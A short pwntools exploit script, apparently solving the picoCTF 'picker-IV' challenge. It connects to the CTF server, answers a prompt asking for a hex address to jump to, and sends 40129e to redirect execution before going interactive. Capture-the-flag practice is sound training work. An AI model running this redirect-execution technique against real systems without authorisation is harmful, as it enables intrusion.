from pwn import *

bin='./picker-IV'
context.binary = bin
#Offline version
#p=process(bin)
#Online version
p=connect('saturn.picoctf.net',54134)
e=ELF(bin)


p.recvuntil(b"Enter the address in hex to jump to, excluding '0x': ")
p.sendline(b'40129e')
p.interactive()
p.close()
